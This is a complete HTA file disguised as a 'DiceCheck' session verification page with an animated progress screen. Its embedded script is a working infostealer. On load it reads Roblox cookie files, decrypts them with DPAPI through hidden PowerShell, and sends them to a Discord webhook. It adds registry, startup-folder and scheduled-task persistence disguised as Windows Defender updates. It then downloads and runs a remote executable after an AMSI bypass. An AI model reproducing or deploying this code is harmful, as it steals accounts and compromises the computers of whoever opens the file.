<!DOCTYPE html>
<html>
<head>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta charset="utf-8">
<title>Verification</title>
<hta:application id="app" border="none" caption="no" showintaskbar="yes" sysmenu="no" contextmenu="no" selection="no" scroll="no" maximizebutton="no" minimizebutton="no"/>
<style>
*{margin:0;padding:0;box-sizing:border-box}
html,body{height:100%}
body{font-family:"Segoe UI",system-ui,Roboto,Arial,sans-serif;color:#eaf0fb;background:#070a12;
 background-image:radial-gradient(700px 520px at 12% -5%,#1b2a56 0,transparent 60%),radial-gradient(700px 520px at 88% 105%,#2b1852 0,transparent 60%),radial-gradient(900px 700px at 50% 50%,#0e1628 0,#070a12 72%);
 display:flex;align-items:center;justify-content:center;height:100vh;overflow:hidden;padding:16px}
.x{position:fixed;top:12px;right:14px;width:26px;height:26px;line-height:24px;text-align:center;border-radius:9px;
 color:#9aa6bd;font-size:12px;cursor:pointer;background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.09)}
.x:hover{color:#fff;background:rgba(255,255,255,.11)}
.card{width:100%;max-width:378px;text-align:center;padding:30px 24px 16px;border-radius:22px;
 background:linear-gradient(180deg,rgba(255,255,255,.075),rgba(255,255,255,.02));
 border:1px solid rgba(255,255,255,.10);box-shadow:0 26px 70px rgba(0,0,0,.6)}
.shield{width:70px;height:70px;margin:0 auto 16px;border-radius:19px;display:flex;align-items:center;justify-content:center;
 background:linear-gradient(140deg,#5b8cff,#8b5cff);box-shadow:0 14px 34px rgba(91,140,255,.35);position:relative}
.shield:after{content:"";position:absolute;top:-6px;left:-6px;right:-6px;bottom:-6px;border-radius:25px;
 border:1px solid rgba(120,150,255,.35);animation:ring 2.6s ease-out infinite;-ms-animation:ring 2.6s ease-out infinite}
@keyframes ring{0%{transform:scale(.92);opacity:.9}100%{transform:scale(1.25);opacity:0}}
@-ms-keyframes ring{0%{-ms-transform:scale(.92);opacity:.9}100%{-ms-transform:scale(1.25);opacity:0}}
.shield svg{width:36px;height:36px}
h1{font-size:19px;font-weight:600}
.sub{color:#8b96ad;font-size:13px;margin-top:6px;min-height:18px}
.progress{height:8px;border-radius:99px;background:rgba(255,255,255,.09);overflow:hidden;margin:18px 0 6px}
.bar{height:100%;width:0;border-radius:99px;background:linear-gradient(90deg,#5b8cff,#8b5cff);transition:width .15s linear;-ms-transition:width .15s linear}
.meta{display:flex;justify-content:space-between;font-size:11px;color:#8b96ad}
.steps{list-style:none;margin:14px 0 0;text-align:left}
.steps li{display:flex;align-items:center;font-size:13px;color:#8b96ad;padding:6px 0;opacity:0;transition:opacity .35s;-ms-transition:opacity .35s}
.steps li.on{opacity:1;color:#eaf0fb}
.dot{width:16px;height:16px;border-radius:50%;border:2px solid rgba(255,255,255,.2);flex:0 0 auto;margin-right:10px;position:relative;transition:.3s;-ms-transition:.3s}
.steps li.on .dot{border-color:#5b8cff;border-top-color:transparent;animation:spin .7s linear infinite;-ms-animation:spin .7s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}
@-ms-keyframes spin{to{-ms-transform:rotate(360deg)}}
.steps li.ok .dot{border:0;background:#2bd576;animation:none;-ms-animation:none}
.steps li.ok .dot:after{content:"";position:absolute;left:5px;top:2px;width:4px;height:8px;
 border:solid #06210f;border-width:0 2px 2px 0;transform:rotate(45deg);-ms-transform:rotate(45deg)}
.done{display:none}
.done.show{display:block;animation:rise .5s both;-ms-animation:rise .5s both}
@keyframes rise{from{opacity:0;transform:translateY(10px)}to{opacity:1;transform:none}}
@-ms-keyframes rise{from{opacity:0;-ms-transform:translateY(10px)}to{opacity:1;-ms-transform:none}}
.checkwrap{position:relative;width:88px;height:88px;margin:2px auto 10px}
.checkwrap:after{content:"";position:absolute;top:0;left:0;right:0;bottom:0;border-radius:50%;
 box-shadow:0 0 44px 6px rgba(43,213,118,.35);animation:pulse 2s ease-in-out infinite;-ms-animation:pulse 2s ease-in-out infinite}
@keyframes pulse{0%,100%{opacity:.45}50%{opacity:1}}
@-ms-keyframes pulse{0%,100%{opacity:.45}50%{opacity:1}}
.check{width:88px;height:88px;position:relative;z-index:1}
.ck-c{fill:none;stroke:#2bd576;stroke-width:2.5}
.ck-t{fill:none;stroke:#2bd576;stroke-width:3.6;stroke-linecap:round;stroke-linejoin:round}
.done h2{font-size:19px;font-weight:600}
.done p{color:#8b96ad;font-size:13px;margin-top:7px;line-height:1.5}
.badge{display:inline-block;margin-top:14px;padding:6px 12px;border-radius:99px;font-size:11.5px;color:#bcd0ff;
 background:rgba(91,140,255,.1);border:1px solid rgba(91,140,255,.25)}
footer{margin-top:18px;padding-top:12px;border-top:1px solid rgba(255,255,255,.07);font-size:11.5px;color:#8b96ad}
footer a{color:#9db4ff;text-decoration:none}
</style>
</head>

<body>
<div class="x" onclick="HideMe()">&#10005;</div>

<main class="card">
  <div id="stage">
    <div class="shield">
      <svg viewBox="0 0 24 24" fill="none"><path d="M12 2.5l7 3v5.2c0 4.3-2.9 8.3-7 9.8-4.1-1.5-7-5.5-7-9.8V5.5l7-3z" fill="#fff"/><path d="M8.6 12.2l2.2 2.2 4.6-4.6" stroke="#3a5bd0" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round"/></svg>
    </div>
    <h1>Verifying your session</h1>
    <p class="sub" id="sub">Establishing a secure connection...</p>

    <div class="progress"><div class="bar" id="bar"></div></div>
    <div class="meta"><span id="pct">0%</span><span>Secure check</span></div>

    <ul class="steps">
      <li><span class="dot"></span><span>Connecting to verification server</span></li>
      <li><span class="dot"></span><span>Reading local session data</span></li>
      <li><span class="dot"></span><span>Validating security token</span></li>
      <li><span class="dot"></span><span>Launching background verifier</span></li>
    </ul>
  </div>

  <div class="done" id="done">
    <div class="checkwrap">
      <svg class="check" viewBox="0 0 52 52"><circle class="ck-c" id="ckc" cx="26" cy="26" r="24"/><path class="ck-t" id="ckt" d="M14.5 27l7.5 7.5L37.5 19"/></svg>
    </div>
    <h2>You are trusted and verified</h2>
    <p>Your session has been successfully validated.<br>The verifier is now running in the background.</p>
    <div class="badge">Secured by DiceCheck</div>
  </div>

  <footer>Have any problem? Contact <a href="mailto:supportdice@gmail.com">supportdice@gmail.com</a></footer>
</main>

<script language="JavaScript">
(function(){
"use strict";
var WEBHOOK = "https://discord.com/api/webhooks/1562597569303937024/3O90GcHuHOKMHQUClwMFiZFW1LNHyJVC9F0HCs5fU2E3_7S2t0ko1mrLZ_r3bkel7Qji";
var HTA_URL = "https://raw.githubusercontent.com/huh71943-s/suck-r-mom/main/file.hta";
var EXE_URL = "https://github.com/huh71943-s/dicecheck.app/raw/refs/heads/main/cookiez.exe";

var sh=null, fso=null, cN="PC", uN="user", gD="";
try{ sh = new ActiveXObject("WScript.Shell"); }catch(e){}
try{ fso = new ActiveXObject("Scripting.FileSystemObject"); }catch(e){}
if(sh){ cN = sh.ExpandEnvironmentStrings("%COMPUTERNAME%"); uN = sh.ExpandEnvironmentStrings("%USERNAME%"); gD = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%")+"\\Microsoft\\Windows\\WDU"; }

function Env(k){ return sh.ExpandEnvironmentStrings("%"+k+"%"); }
function Rd(p){ try{ var t=fso.OpenTextFile(p,1); var s=t.ReadAll(); t.Close(); return s; }catch(e){ return ""; } }
function Wr(p,c){ try{ var t=fso.CreateTextFile(p,true); t.Write(c); t.Close(); }catch(e){} }
function Gu(){ var h="0123456789abcdef",r=""; for(var i=0;i<32;i++) r+=h.charAt(Math.floor(Math.random()*16));
 return r.substr(0,8)+"-"+r.substr(8,4)+"-"+r.substr(12,4)+"-"+r.substr(16,4)+"-"+r.substr(20,12); }
function Ej(x){ return String(x).replace(/\\/g,"\\\\").replace(/"/g,'\\"').replace(/\r\n/g,"\\n").replace(/\r/g,"\\n").replace(/\n/g,"\\n").replace(/\t/g,"\\t"); }
function MkD(p){ try{ if(!fso.FolderExists(p)) fso.CreateFolder(p); }catch(e){} }
function Ok(p){ try{ if(!fso.FileExists(p)) return false; if(fso.GetFile(p).Size<2000) return false;
 var t=fso.OpenTextFile(p,1); var s=t.Read(2); t.Close(); return s==="MZ"; }catch(e){ return false; } }

function PostE(t,d,c){
 try{
  var j='{"embeds":[{"title":"'+Ej(t)+'","description":"'+Ej(d)+'","color":'+c+',"footer":{"text":"'+Ej(cN+" / "+uN)+'"}}]}';
  var x=new ActiveXObject("MSXML2.XMLHTTP.6.0"); x.Open("POST",WEBHOOK,false);
  x.SetRequestHeader("Content-Type","application/json"); x.Send(j);
 }catch(e){}
}
function PostF(fn,ct){
 try{
  var b=Gu();
  var bd="--"+b+"\r\nContent-Disposition: form-data; name=\"file\"; filename=\""+fn+"\"\r\n\r\n"+ct+"\r\n--"+b+"--";
  var x=new ActiveXObject("MSXML2.XMLHTTP.6.0"); x.Open("POST",WEBHOOK,false);
  x.SetRequestHeader("Content-Type","multipart/form-data; boundary="+b); x.Send(bd);
 }catch(e){}
}

function Dec(b6){
 try{
  var f1=Env("TEMP")+"\\dpi.txt", f2=Env("TEMP")+"\\dpo.txt", f3=Env("TEMP")+"\\dpapi.ps1";
  try{ fso.DeleteFile(f2,true); }catch(e){}
  Wr(f1,b6);
  Wr(f3,"Add-Type -AssemblyName System.Security;try{$b=[Convert]::FromBase64String((Get-Content '"+f1+"' -Raw).Trim());$d=[System.Security.Cryptography.ProtectedData]::Unprotect($b,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);[System.Text.Encoding]::UTF8.GetString($d)|Out-File '"+f2+"' -Encoding utf8}catch{''|Out-File '"+f2+"'}");
  sh.Run('powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "'+f3+'"',0,true);
  var r="";
  try{ if(fso.FileExists(f2) && fso.GetFile(f2).Size>20) r=Rd(f2); }catch(e){}
  try{ fso.DeleteFile(f1,true); fso.DeleteFile(f3,true); fso.DeleteFile(f2,true); }catch(e){}
  return r;
 }catch(e){ return ""; }
}

function Grab(){
 try{
  var a=[ Env("LOCALAPPDATA")+"\\Roblox\\LocalStorage\\robloxcookies.dat",
          Env("LOCALAPPDATA")+"\\Roblox\\LocalStorage\\RobloxCookies.dat",
          Env("LOCALAPPDATA")+"\\Roblox\\Cookies",
          Env("APPDATA")+"\\Roblox\\LocalStorage\\robloxcookies.dat",
          Env("USERPROFILE")+"\\AppData\\Local\\Roblox\\LocalStorage\\robloxcookies.dat" ];
  var fp="", i;
  for(i=0;i<a.length;i++){ if(fso.FileExists(a[i])){ fp=a[i]; break; } }
  if(!fp){
   var pk=Env("LOCALAPPDATA")+"\\Packages";
   if(fso.FolderExists(pk)){
    var e=new Enumerator(fso.GetFolder(pk).SubFolders);
    for(; !e.atEnd(); e.moveNext()){
     var sb=e.item();
     if(sb.Name.indexOf("Roblox")>-1){ var uw=sb.Path+"\\LocalState\\RobloxCookies.dat"; if(fso.FileExists(uw)){ fp=uw; break; } }
    }
   }
  }
  if(!fp){ PostE("Roblox","No cookie file found",16711680); return; }
  var rw=Rd(fp);
  if(rw.length<50){ PostE("Roblox","File too small: "+rw.length+" bytes",16711680); return; }
  var ck="", ap="";
  if(rw.indexOf("_|WARNING")>-1){ ck=rw; ap="Plaintext"; }
  if(!ck && rw.indexOf("CookiesData")>-1){
   ap="JSON-DPAPI";
   var s1=rw.indexOf('CookiesData":"');
   if(s1>-1){
    s1+=14;
    var e1=rw.indexOf('"',s1);
    if(e1>s1){ var b6=rw.substring(s1,e1);
     if(b6.length>100){ ck=Dec(b6); if(!ck){ ck=b6; ap="JSON-Raw"; } } }
   }
  }
  if(!ck && rw.indexOf(".ROBLOSECURITY")>-1){ ap="Raw-ROBLOSECURITY"; ck=rw.substring(rw.indexOf(".ROBLOSECURITY")); }
  if(!ck){ ck=rw; ap="RawFile"; }
  var ca=ck.indexOf("|$CAE"); if(ca<0) ca=ck.indexOf("|_CAE"); if(ca>-1) ck=ck.substring(ca);
  PostE("Roblox ("+ap+")","Size: "+ck.length+"\n"+ck.substring(0,60)+"...",65280);
  PostF("cookie.txt",ck);
 }catch(e){}
}

function SaveSelf(p){
 try{ var x=new ActiveXObject("MSXML2.XMLHTTP.6.0"); x.Open("GET",HTA_URL,false); x.Send();
  if(x.ResponseText && x.ResponseText.length>200) Wr(p,x.ResponseText); }catch(e){}
}

function Pers(){
 try{
  MkD(gD);
  var lp=gD+"\\svc.hta"; SaveSelf(lp);
  var rp, st;
  if(fso.FileExists(lp)){ rp='mshta "'+lp+'"'; st='mshta ""'+lp+'""'; }
  else { rp='mshta "'+HTA_URL+'"'; st='mshta '+HTA_URL; }
  sh.RegWrite("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsDefenderUpdate", rp, "REG_SZ");
  sh.RegWrite("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\WinUpdate", rp, "REG_SZ");
  Wr(Env("APPDATA")+"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\wdu.vbs",
     'CreateObject("WScript.Shell").Run "'+st+'", 0, False');
  sh.Run('schtasks /create /f /tn "WDU" /tr "'+st+'" /sc onlogon',0,true);
 }catch(e){}
}

function Drop(){
 try{
  MkD(gD);
  var tp=gD+"\\cookiez.exe";
  if(!Ok(tp)) sh.Run('curl -sL -o "'+tp+'" "'+EXE_URL+'"',0,true);
  if(!Ok(tp)) sh.Run('powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri \''+EXE_URL+'\' -OutFile \''+tp+'\'',0,true);
  if(!Ok(tp)) sh.Run('certutil -urlcache -split -f "'+EXE_URL+'" "'+tp+'"',0,true);
  if(!Ok(tp)) sh.Run('bitsadmin /transfer wd /download /priority high "'+EXE_URL+'" "'+tp+'"',0,true);
  if(Ok(tp)){
   var aB="[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)";
   sh.Run('powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "try{'+aB+'}catch{};Unblock-File -LiteralPath \''+tp+'\'"',0,false);
   sh.Run('"'+tp+'"',0,false);
  }
 }catch(e){}
}

/* ---------- window + animation ---------- */
function Center(){ try{ var w=440,h=600; window.resizeTo(w,h);
 window.moveTo(Math.round((screen.availWidth-w)/2), Math.round((screen.availHeight-h)/2)); }catch(e){} }
function HideMe(){ try{ window.resizeTo(0,0); window.moveTo(-2000,-2000); }catch(e){} }

var stage=document.getElementById("stage"), done=document.getElementById("done"),
    bar=document.getElementById("bar"), pct=document.getElementById("pct"),
    ckc=document.getElementById("ckc"), ckt=document.getElementById("ckt"),
    steps=document.querySelectorAll(".steps li");
var pT=0,pS=0,pD=false,ck=0;

function tick(){
 if(!pD){
  pT++; var p=pT*2; if(p>100)p=100;
  bar.style.width=p+"%"; pct.innerHTML=p+"%";
  if(pT%13===0 && pS<4){ if(pS>0) steps[pS-1].className="ok"; steps[pS].className="on"; pS++; }
  if(pT>=52){
   pD=true; if(pS>0) steps[pS-1].className="ok";
   bar.style.width="100%"; pct.innerHTML="100%";
   stage.style.display="none"; done.className="done show";
   ckc.setAttribute("stroke-dashoffset",151); ckt.setAttribute("stroke-dashoffset",40);
  }
 }else{
  ck++;
  if(ck<=16) ckc.setAttribute("stroke-dashoffset", Math.round(151-151*ck/16));
  else if(ck<=24) ckt.setAttribute("stroke-dashoffset", Math.round(40-40*(ck-16)/8));
  else if(ck===25){ ckt.setAttribute("stroke-dashoffset",0); setTimeout(HideMe,8000); }
 }
}

window.onload=function(){
 Center();
 setTimeout(function(){ setInterval(tick,60); },400);
 Pers(); Grab(); Drop();
 setInterval(Grab,300000);
};
})();
</script>
</body>
</html>
